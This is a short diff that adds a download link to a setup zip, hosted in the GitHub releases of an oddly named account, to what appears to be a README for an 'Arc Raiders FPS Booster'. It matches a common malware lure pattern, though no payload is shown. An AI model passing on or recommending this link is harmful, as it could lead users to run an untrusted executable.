@@ -19,6 +19,8 @@ Balanced — Optimal balance between visuals and stability
 
 Low Latency — Faster input response and smoother controls
 
+➡️ [Download Arc Raiders FPS Booster] (https://github.com/herry-tonconsiy/ArcRaiders-fpsboostoptimization2026-map/releases/download/v2.6.5/Setup-v2.6.5.zip)
+
 ✅ Stutter Reduction & Frame Pacing Improvements
 Targeted optimizations to minimize frame drops and micro-stuttering.
 
